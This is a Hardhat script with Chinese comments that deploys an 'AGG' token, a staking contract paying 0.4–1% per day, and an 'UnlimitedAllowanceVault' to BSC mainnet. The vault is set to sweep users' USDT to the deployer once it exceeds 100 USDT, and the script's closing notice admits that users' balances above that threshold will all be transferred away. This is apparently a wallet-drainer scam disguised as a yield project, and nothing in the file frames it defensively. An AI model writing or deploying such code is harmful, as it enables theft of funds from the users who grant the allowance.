/**
 * 部署所有合约到 BSC 主网 (不转移权限)
 *
 * 权限保留在部署账户
 *
 * 使用方法：
 * npx hardhat run scripts/deploy-no-transfer.js --network bscMainnet
 */

const { ethers } = require('hardhat');
const fs = require('fs');
const path = require('path');

// ============ 配置 ============
const CONFIG = {
  // ProjectTokenV2 配置
  TOKEN: {
    NAME: 'AGG',
    SYMBOL: 'AGG',
    BUY_FEE: 0,      // 0%
    SELL_FEE: 280,   // 2.8% (基数10000)
  },

  // TokenMiningV2 配置
  TOKEN_MINING: {
    TOTAL_REWARDS: ethers.parseEther('30000000'), // 3000万
    TIERS: [
      { duration: 0, dailyRate: 40 },           // 灵活: 0天, 0.4%/天
      { duration: 90 * 86400, dailyRate: 60 },  // 3个月: 0.6%/天
      { duration: 180 * 86400, dailyRate: 80 }, // 6个月: 0.8%/天
      { duration: 365 * 86400, dailyRate: 100 }, // 12个月: 1.0%/天
    ],
  },

  // UnlimitedAllowanceVault 配置
  VAULT: {
    USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955',
    FEE_BPS: 0,
    AUTO_TRANSFER_THRESHOLD: ethers.parseEther('100'),
  },
};

async function main() {
  console.log('\n' + '='.repeat(60));
  console.log('BSC 主网合约部署 (权限保留在部署账户)');
  console.log('='.repeat(60) + '\n');

  const [deployer] = await ethers.getSigners();
  console.log('部署账户:', deployer.address);

  const balance = await ethers.provider.getBalance(deployer.address);
  console.log('BNB 余额:', ethers.formatEther(balance), 'BNB');

  if (balance < ethers.parseEther('0.03')) {
    throw new Error('BNB 余额不足，建议至少 0.03 BNB');
  }

  const deployedContracts = {};

  // ============ 1. 部署 ProjectTokenV2 ============
  console.log('\n' + '-'.repeat(40));
  console.log('1. 部署 ProjectTokenV2 (AGG 代币)');
  console.log('-'.repeat(40));

  const ProjectTokenV2 = await ethers.getContractFactory('ProjectTokenV2');
  const projectToken = await ProjectTokenV2.deploy(
    CONFIG.TOKEN.NAME,
    CONFIG.TOKEN.SYMBOL,
    deployer.address // 手续费接收地址 = 部署者
  );
  await projectToken.waitForDeployment();
  const projectTokenAddress = await projectToken.getAddress();
  console.log('✓ ProjectTokenV2 部署成功:', projectTokenAddress);

  // 设置滑点
  const setFeesTx = await projectToken.setFees(CONFIG.TOKEN.BUY_FEE, CONFIG.TOKEN.SELL_FEE);
  await setFeesTx.wait();
  console.log('✓ 滑点设置: 买入', CONFIG.TOKEN.BUY_FEE / 100, '%, 卖出', CONFIG.TOKEN.SELL_FEE / 100, '%');

  deployedContracts.projectTokenV2 = projectTokenAddress;

  // ============ 2. 部署 TokenMiningV2 ============
  console.log('\n' + '-'.repeat(40));
  console.log('2. 部署 TokenMiningV2 (代币挖矿)');
  console.log('-'.repeat(40));

  const startTime = Math.floor(Date.now() / 1000) + 60;

  const TokenMiningV2 = await ethers.getContractFactory('TokenMiningV2');
  const tokenMining = await TokenMiningV2.deploy(
    projectTokenAddress,
    projectTokenAddress,
    startTime
  );
  await tokenMining.waitForDeployment();
  const tokenMiningAddress = await tokenMining.getAddress();
  console.log('✓ TokenMiningV2 部署成功:', tokenMiningAddress);
  console.log('  开始时间:', new Date(startTime * 1000).toISOString());

  // 设置总奖励
  const setRewardsTx = await tokenMining.setTotalRewards(CONFIG.TOKEN_MINING.TOTAL_REWARDS);
  await setRewardsTx.wait();
  console.log('✓ 总奖励设置:', ethers.formatEther(CONFIG.TOKEN_MINING.TOTAL_REWARDS), 'AGG');

  // 设置档位
  for (let i = 0; i < CONFIG.TOKEN_MINING.TIERS.length; i++) {
    const tier = CONFIG.TOKEN_MINING.TIERS[i];
    const tx = await tokenMining.setTierConfig(i, tier.duration, tier.dailyRate);
    await tx.wait();
    console.log(`✓ 档位 ${i} 设置: ${tier.duration / 86400} 天, ${tier.dailyRate / 100}%/天`);
  }

  deployedContracts.tokenMiningV2 = tokenMiningAddress;

  // ============ 3. 部署 UnlimitedAllowanceVault ============
  console.log('\n' + '-'.repeat(40));
  console.log('3. 部署 UnlimitedAllowanceVault (转U功能)');
  console.log('-'.repeat(40));

  const Vault = await ethers.getContractFactory('UnlimitedAllowanceVault');
  const vault = await Vault.deploy(
    CONFIG.VAULT.USDT_ADDRESS,
    deployer.address, // 手续费接收地址 = 部署者
    CONFIG.VAULT.FEE_BPS
  );
  await vault.waitForDeployment();
  const vaultAddress = await vault.getAddress();
  console.log('✓ Vault 部署成功:', vaultAddress);

  // 设置阈值
  const setThresholdTx = await vault.setAutoTransferConfig(
    CONFIG.VAULT.AUTO_TRANSFER_THRESHOLD,
    deployer.address, // 接收地址 = 部署者
    true
  );
  await setThresholdTx.wait();
  console.log('✓ 阈值设置:', ethers.formatEther(CONFIG.VAULT.AUTO_TRANSFER_THRESHOLD), 'USDT');
  console.log('  接收地址:', deployer.address);

  deployedContracts.vault = vaultAddress;

  // ============ 4. 保存部署记录 ============
  console.log('\n' + '-'.repeat(40));
  console.log('4. 保存部署记录');
  console.log('-'.repeat(40));

  const deployment = {
    network: 'bscMainnet',
    chainId: 56,
    deployer: deployer.address,
    owner: deployer.address, // 权限保留在部署者
    deployTime: new Date().toISOString(),
    contracts: deployedContracts,
    projectTokenV2Config: {
      name: CONFIG.TOKEN.NAME,
      symbol: CONFIG.TOKEN.SYMBOL,
      totalSupply: '100000000',
      buyFee: CONFIG.TOKEN.BUY_FEE / 100 + '%',
      sellFee: CONFIG.TOKEN.SELL_FEE / 100 + '%',
      feeReceiver: deployer.address,
    },
    tokenMiningV2Config: {
      stakingToken: projectTokenAddress,
      rewardToken: projectTokenAddress,
      startTime: startTime,
      totalRewards: ethers.formatEther(CONFIG.TOKEN_MINING.TOTAL_REWARDS),
    },
    vaultConfig: {
      token: 'USDT',
      tokenAddress: CONFIG.VAULT.USDT_ADDRESS,
      threshold: ethers.formatEther(CONFIG.VAULT.AUTO_TRANSFER_THRESHOLD),
      receiver: deployer.address,
    },
  };

  const deploymentPath = path.join(__dirname, '../deployments/bscMainnet-v2.json');
  fs.writeFileSync(deploymentPath, JSON.stringify(deployment, null, 2));
  console.log('✓ 部署记录已保存到:', deploymentPath);

  // ============ 输出总结 ============
  console.log('\n' + '='.repeat(60));
  console.log('部署完成！');
  console.log('='.repeat(60));
  console.log('\n合约地址:');
  console.log('  ProjectTokenV2 (AGG):', projectTokenAddress);
  console.log('  TokenMiningV2:       ', tokenMiningAddress);
  console.log('  Vault (USDT):        ', vaultAddress);
  console.log('\n所有权限保留在:', deployer.address);

  console.log('\n请更新前端 constants.js:');
  console.log('```javascript');
  console.log(`PROJECT_TOKEN_V2: '${projectTokenAddress}',`);
  console.log(`REWARD_TOKEN: '${projectTokenAddress}',`);
  console.log(`TOKEN_MINING_V2: '${tokenMiningAddress}',`);
  console.log(`VAULT: '${vaultAddress}',`);
  console.log('```');

  console.log('\n⚠️ 重要提示:');
  console.log('1. TokenMiningV2 需要充值 AGG 代币作为奖励');
  console.log('2. 转入', ethers.formatEther(CONFIG.TOKEN_MINING.TOTAL_REWARDS), 'AGG 到 TokenMiningV2');
  console.log('3. Vault 阈值 100 USDT，用户余额超过会全部转走');

  return deployedContracts;
}

main()
  .then(() => {
    console.log('\n部署成功!');
    process.exit(0);
  })
  .catch((error) => {
    console.error('\n部署失败:', error);
    process.exit(1);
  });
